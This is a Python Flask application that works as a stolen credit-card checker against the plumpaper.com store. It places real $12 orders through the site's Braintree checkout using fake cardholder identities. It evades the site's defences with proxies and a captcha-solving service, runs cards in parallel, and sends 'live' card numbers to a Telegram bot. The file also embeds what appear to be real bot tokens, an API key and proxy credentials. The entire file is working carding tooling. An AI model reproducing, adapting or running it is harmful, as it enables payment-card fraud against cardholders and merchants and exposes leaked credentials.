from flask import Flask, render_template, request, jsonify
import requests
import base64
import time
import json
import random
import re
import uuid
from faker import Faker
import threading
from datetime import datetime
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from raven import RavenClient
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

app = Flask(__name__)
app.secret_key = 'your-secret-key-here'

fake = Faker('en_US')

# Real New York addresses
NY_ADDRESSES = [
    # Manhattan addresses
    {"street": "Broadway", "city": "New York", "zip": "10001", "zip_range": (10001, 10099)},
    {"street": "5th Avenue", "city": "New York", "zip": "10010", "zip_range": (10001, 10099)},
    {"street": "Lexington Avenue", "city": "New York", "zip": "10016", "zip_range": (10001, 10099)},
    {"street": "Park Avenue", "city": "New York", "zip": "10017", "zip_range": (10001, 10099)},
    {"street": "Madison Avenue", "city": "New York", "zip": "10022", "zip_range": (10001, 10099)},
    {"street": "West 42nd Street", "city": "New York", "zip": "10036", "zip_range": (10001, 10099)},
    {"street": "West 34th Street", "city": "New York", "zip": "10001", "zip_range": (10001, 10099)},
    {"street": "Canal Street", "city": "New York", "zip": "10013", "zip_range": (10001, 10099)},
    {"street": "Houston Street", "city": "New York", "zip": "10014", "zip_range": (10001, 10099)},
    {"street": "Bleecker Street", "city": "New York", "zip": "10012", "zip_range": (10001, 10099)},
    # Brooklyn addresses
    {"street": "Flatbush Avenue", "city": "Brooklyn", "zip": "11201", "zip_range": (11201, 11299)},
    {"street": "Atlantic Avenue", "city": "Brooklyn", "zip": "11217", "zip_range": (11201, 11299)},
    {"street": "Prospect Park West", "city": "Brooklyn", "zip": "11215", "zip_range": (11201, 11299)},
    {"street": "Court Street", "city": "Brooklyn", "zip": "11231", "zip_range": (11201, 11299)},
    {"street": "4th Avenue", "city": "Brooklyn", "zip": "11209", "zip_range": (11201, 11299)},
    {"street": "Bedford Avenue", "city": "Brooklyn", "zip": "11211", "zip_range": (11201, 11299)},
    {"street": "Kings Highway", "city": "Brooklyn", "zip": "11229", "zip_range": (11201, 11299)},
    {"street": "Ocean Parkway", "city": "Brooklyn", "zip": "11218", "zip_range": (11201, 11299)},
    # Queens addresses
    {"street": "Queens Boulevard", "city": "Queens", "zip": "11101", "zip_range": (11101, 11499)},
    {"street": "Northern Boulevard", "city": "Queens", "zip": "11103", "zip_range": (11101, 11499)},
    {"street": "Roosevelt Avenue", "city": "Queens", "zip": "11368", "zip_range": (11101, 11499)},
    {"street": "Main Street", "city": "Queens", "zip": "11355", "zip_range": (11101, 11499)},
    {"street": "Astoria Boulevard", "city": "Queens", "zip": "11102", "zip_range": (11101, 11499)},
    # Bronx addresses
    {"street": "Fordham Road", "city": "Bronx", "zip": "10458", "zip_range": (10451, 10499)},
    {"street": "Grand Concourse", "city": "Bronx", "zip": "10451", "zip_range": (10451, 10499)},
    {"street": "Pelham Parkway", "city": "Bronx", "zip": "10467", "zip_range": (10451, 10499)},
    {"street": "White Plains Road", "city": "Bronx", "zip": "10462", "zip_range": (10451, 10499)},
]

# Telegram configuration
TELEGRAM_BOT_TOKEN = "7253814334:AAFoE76B6pg_roL0AVG8cMAMLLeroGcG2As"
TELEGRAM_USER_ID = "2118935021"

# Raven API configuration
RAVEN_API_KEY = "sk-3HkR8-mSf2KLqiem_EDV4ZNUbmCHHOQdAI8cc8Io-dg"

# Store active sessions
active_sessions = {}
session_locks = {}

# Thread pool for concurrent processing
thread_pool = ThreadPoolExecutor(max_workers=5)

def get_session_lock(session_id):
    if session_id not in session_locks:
        session_locks[session_id] = threading.Lock()
    return session_locks[session_id]

def send_to_telegram(message):
    """Send message to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_USER_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, data=data, timeout=10)
        return response.status_code == 200
    except:
        return False

def get_str(string, start, end):
    start_pos = string.find(start)
    if start_pos == -1:
        return None
    start_pos += len(start)
    end_pos = string.find(end, start_pos)
    if end_pos == -1:
        return None
    return string[start_pos:end_pos]

def generate_real_ny_address():
    """Generate a real New York address"""
    addr_data = random.choice(NY_ADDRESSES)
    street_num = random.randint(1, 9999)
    street_name = addr_data["street"]
    city = addr_data["city"]
    zip_range = addr_data["zip_range"]
    zip_code = str(random.randint(zip_range[0], zip_range[1]))
    address = f"{street_num} {street_name}"
    return address, city, zip_code

def generate_fake_data():
    """Generate fake user data"""
    name = fake.name()
    last_name = name.split(" ")[-1]
    first_name = name.split(" ")[0]
    address, city, zip_code = generate_real_ny_address()
    state = "NY"
    country = "US"
    phone = fake.phone_number()
    email = f"{first_name}.{last_name}_{zip_code}@gmail.com"
    
    return {
        'name': name,
        'first_name': first_name,
        'last_name': last_name,
        'address': address,
        'city': city,
        'zip_code': zip_code,
        'state': state,
        'country': country,
        'phone': phone,
        'email': email
    }

def create_robust_session(use_proxy=False):
    """Create a session with retry logic and optional proxy"""
    session = requests.Session()
    
    # Configure retry strategy
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["POST", "GET"]
    )
    
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    if use_proxy:
        # Use proxy with authentication
        session.proxies = {
            'http': 'http://rossi:MvMDgYIQmh:ultra.marsproxies.com:44443',
        }
    else:
        # No proxy - direct connection
        session.trust_env = False
    
    return session

def solve_turnstile():
    """Solve Turnstile captcha using RavenClient"""
    try:
        # Disable any system proxies that might be interfering
        os.environ['NO_PROXY'] = 'ai.ravens.best'
        
        # Create session without proxy for RavenClient
        session = requests.Session()
        session.trust_env = False
        
        # Initialize RavenClient
        client = RavenClient(api_key=RAVEN_API_KEY)
        
        # Solve the captcha
        result = client.cloudflare.Turnstile(
            website_url="https://www.plumpaper.com",
            website_key="0x4AAAAAABd5ebsZVkqwLZxj",
        )
        
        print(f"Captcha solved in {result.solution.duration}s")
        return result.solution.token
        
    except Exception as e:
        raise Exception(f"RavenClient captcha solving failed: {str(e)}")

def process_single_card(card, session_id):
    """Process a single credit card"""
    if session_id not in active_sessions:
        return {"status": "stopped", "message": "Session stopped"}
    
    cc, mm, yy, cvv = card.strip().split("|")

    if len(yy) == 2:
        yy = '20' + yy
    if len(mm) == 1:
        mm = '0' + mm

    lista = f"{cc}|{mm}|{yy}|{cvv}"
    user_data = generate_fake_data()

    # Try with proxy first, if it fails, try without proxy
    use_proxy = True
    session_obj = None
    
    for attempt in range(2):
        try:
            session_obj = create_robust_session(use_proxy=use_proxy)
            
            # Test connection
            test_response = session_obj.get('https://www.plumpaper.com', timeout=10)
            if test_response.status_code == 200:
                break
        except Exception as e:
            if attempt == 0:
                print("Proxy connection failed, trying direct connection...")
                use_proxy = False
            else:
                return {"status": "error", "lista": lista, "message": f"Connection failed: {str(e)}"}

    headers = {
        'accept': 'application/json; application/vnd.pp.v1',
        'accept-language': 'en-US,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.plumpaper.com',
        'priority': 'u=1, i',
        'referer': 'https://www.plumpaper.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    }

    try:
        # Step 1: Create cart
        json_data = {
            'line_item': {
                'product_id': 818,
                'quantity': 1,
                'variant_ids': [],
            },
        }

        response = session_obj.post('https://api.plumpaper.com/line_items', headers=headers, json=json_data, timeout=30)
        
        if response.status_code != 200:
            # Try alternative product IDs if 818 doesn't work
            product_ids = [818, 2218, 819, 820]
            for product_id in product_ids:
                json_data = {
                    'line_item': {
                        'product_id': product_id,
                        'quantity': 1,
                        'variant_ids': [],
                    },
                }
                response = session_obj.post('https://api.plumpaper.com/line_items', headers=headers, json=json_data, timeout=30)
                if response.status_code == 200:
                    break
                time.sleep(2)
        
        if response.status_code != 200:
            return {"status": "error", "message": f"Failed to create cart: {response.status_code} - {response.text[:100]}"}

        # Extract the cart UID from the response
        response_json = response.json()
        
        if 'lineItem' in response_json and 'order' in response_json['lineItem']:
            cart_uid = response_json['lineItem']['order']['uid']
        else:
            # Fallback: try to find it in the response text
            response_text = response.text
            cart_uid = get_str(response_text, '"order":{"status":"Cart","uid":"', '"')
            if not cart_uid:
                return {"status": "error", "message": "Failed to extract cart UID"}

        # Step 2: Get Braintree token
        headers_braintree = headers.copy()
        headers_braintree['if-none-match'] = 'W/"ff395652e107831b308c653c1d7559c6"'
        
        response = session_obj.get('https://api.plumpaper.com/braintree', headers=headers_braintree, timeout=30)
        if response.status_code != 200:
            return {"status": "error", "message": f"Failed to get braintree token: {response.status_code}"}
        
        clientToken = response.json()['braintree']['clientToken']
        base64_clientToken = base64.b64decode(clientToken).decode('utf-8')
        authorization_fingerprint = get_str(base64_clientToken, 'authorizationFingerprint":"', '"')

        if not authorization_fingerprint:
            return {"status": "error", "message": "Failed to extract authorization fingerprint"}

        # Step 3: Tokenize card
        headers_tokenize = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.7',
            'authorization': f'Bearer {authorization_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }

        json_data_tokenize = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': str(uuid.uuid4()),
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
            'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvv, 'cardholderName': user_data['name'], 'billingAddress': {'countryCodeAlpha2': 'US', 'extendedAddress': '', 'locality': user_data['city'], 'region': user_data['state'], 'postalCode': user_data['zip_code'], 'streetAddress': user_data['address']}}, 'options': {'validate': False}}},
            'operationName': 'TokenizeCreditCard',
        }

        response = session_obj.post('https://payments.braintree-api.com/graphql', headers=headers_tokenize, json=json_data_tokenize)
        if response.status_code != 200:
            return {"status": "error", "message": f"Tokenization failed: {response.status_code}"}
        
        token_data = response.json()
        if 'errors' in token_data:
            return {"status": "dead", "lista": lista, "message": "Tokenization failed"}
        
        if 'data' not in token_data or 'tokenizeCreditCard' not in token_data['data']:
            return {"status": "error", "message": "Invalid tokenization response"}
            
        token = token_data['data']['tokenizeCreditCard']['token']

        # Solve captcha
        captcha_token = solve_turnstile()

        # Checkout
        headers_checkout = headers.copy()
        json_data_checkout = {
            'checkout': {
                'address': {'address_id': 'new', 'city': user_data['city'], 'country': 'US', 'name': user_data['name'], 'save_address': True, 'state': user_data['state'], 'street1': user_data['address'], 'street2': '', 'zip': user_data['zip_code'], 'settings': {'verified': False, 'skipped': True}},
                'captcha': captcha_token,
                'credit_card': {'country_code_alpha2': 'US', 'credit_card_id': 'new', 'default': False, 'extended_address': '', 'locality': user_data['city'], 'name': user_data['name'], 'postal_code': user_data['zip_code'], 'region': user_data['state'], 'same_as_shipping_address': True, 'save_credit_card': False, 'street_address': user_data['address'], 'token': token},
                'customer': {'email': user_data['email'], 'name': user_data['name']},
                'manual': False, 'payment_method_nonce': '',
                'phone_number': {'phone_number_id': 'new', 'number': user_data['phone'], 'save_phone_number': True},
                'shipping_option_id': 6, 'user_notes': '', 'gift_cards': [], 'referral_count': 0,
            },
        }

        response = session_obj.post(f'https://api.plumpaper.com/carts/{cart_uid}/checkout', headers=headers_checkout, json=json_data_checkout)

        if response.status_code == 404:
            return {"status": "error", "message": "Checkout endpoint not found"}

        response_data = response.json()

        if 'errors' in response_data:
            error_message = response_data['errors'].get('base', ['Unknown error'])[0]
            if 'Payment Processing Error:' in error_message:
                decline_reason = error_message.split('Payment Processing Error: ')[1]
                return {"status": "dead", "lista": lista, "message": f"{decline_reason}"}
            else:
                return {"status": "dead", "lista": lista, "message": f"{error_message}"}
        elif 'order' in response_data:
            # Send to Telegram
            telegram_message = f"💳 <b>LIVE CARD CHARGED</b>\n\n<code>{lista}</code>\n\n💰 Amount: $12\n🏪 Store: Plumpaper\n⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            send_to_telegram(telegram_message)
            return {"status": "live", "lista": lista, "message": "CHARGED ($12)"}
        else:
            return {"status": "dead", "lista": lista, "message": "Unknown response"}

    except Exception as e:
        return {"status": "error", "lista": lista, "message": f"Exception: {str(e)}"}

def process_card_wrapper(card, session_id):
    """Wrapper function to process a single card and update session state"""
    if session_id not in active_sessions:
        return None
    
    # Process the card
    if card.count('|') != 3:
        result = {"card": card, "status": "error", "message": "Invalid format"}
    else:
        result = process_single_card(card, session_id)
        result["card"] = card
    
    # Update session state with thread safety
    with get_session_lock(session_id):
        if session_id in active_sessions:
            session_data = active_sessions[session_id]
            session_data["processed"] += 1
            session_data["progress"] = (session_data["processed"] / session_data["total"]) * 100
            
            # Categorize and add result
            if result["status"] == "live":
                session_data["live_cards"].append(result)
                session_data["live_count"] = len(session_data["live_cards"])
            elif (result["status"] == "dead" and 
                  result["message"] and (
                      "insufficient" in result["message"].lower() or 
                      "funds" in result["message"].lower() or
                      "limit" in result["message"].lower() or
                      "51" in result["message"]
                  )):
                session_data["insufficient_cards"].append(result)
                session_data["insufficient_count"] = len(session_data["insufficient_cards"])
            else:
                session_data["declined_cards"].append(result)
                session_data["declined_count"] = len(session_data["declined_cards"])
            
            session_data["results"].append(result)
    
    return result

def process_cards_in_thread(cards, session_id):
    """Process cards using thread pool for concurrent processing"""
    # Submit all cards to thread pool
    futures = []
    for card in cards:
        if session_id not in active_sessions:
            break
        future = thread_pool.submit(process_card_wrapper, card, session_id)
        futures.append(future)
    
    # Wait for all tasks to complete
    for future in as_completed(futures):
        if session_id not in active_sessions:
            break
        # Result is already handled in the wrapper function
    
    # Mark as completed
    if session_id in active_sessions:
        active_sessions[session_id]["completed"] = True

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_check', methods=['POST'])
def start_check():
    data = request.get_json()
    cards_text = data.get('cards', '')
    
    # Parse cards
    cards = [card.strip() for card in cards_text.split('\n') if card.strip()]
    
    if not cards:
        return jsonify({'error': 'No cards provided'}), 400
    
    # Create session
    session_id = str(uuid.uuid4())
    active_sessions[session_id] = {
        'total': len(cards),
        'processed': 0,
        'live_count': 0,
        'insufficient_count': 0,
        'declined_count': 0,
        'progress': 0,
        'completed': False,
        'results': [],
        'live_cards': [],
        'insufficient_cards': [],
        'declined_cards': []
    }
    
    # Start processing in background thread
    thread = threading.Thread(target=process_cards_in_thread, args=(cards, session_id))
    thread.daemon = True
    thread.start()
    
    return jsonify({'session_id': session_id})

@app.route('/progress/<session_id>')
def get_progress(session_id):
    if session_id not in active_sessions:
        return jsonify({'error': 'Session not found'}), 404
    
    session_data = active_sessions[session_id]
    return jsonify({
        'progress': session_data['progress'],
        'processed': session_data['processed'],
        'total': session_data['total'],
        'live_count': session_data['live_count'],
        'insufficient_count': session_data['insufficient_count'],
        'declined_count': session_data['declined_count'],
        'completed': session_data['completed']
    })

@app.route('/live_results/<session_id>')
def get_live_results(session_id):
    if session_id not in active_sessions:
        return jsonify({'error': 'Session not found'}), 404
    
    session_data = active_sessions[session_id]
    return jsonify({
        'live_cards': session_data['live_cards'],
        'insufficient_cards': session_data['insufficient_cards'],
        'declined_cards': session_data['declined_cards']
    })

@app.route('/stop/<session_id>', methods=['POST'])
def stop_session(session_id):
    if session_id in active_sessions:
        del active_sessions[session_id]
    if session_id in session_locks:
        del session_locks[session_id]
    return jsonify({'status': 'stopped'})

if __name__ == "__main__":
    # Create templates and static folders if they don't exist
    if not os.path.exists("templates"):
        os.makedirs("templates")
    if not os.path.exists("static"):
        os.makedirs("static")
    
    port = int(os.environ.get("PORT", 5000))  # <-- هنا المهم
    app.run(host="0.0.0.0", port=port, debug=False)
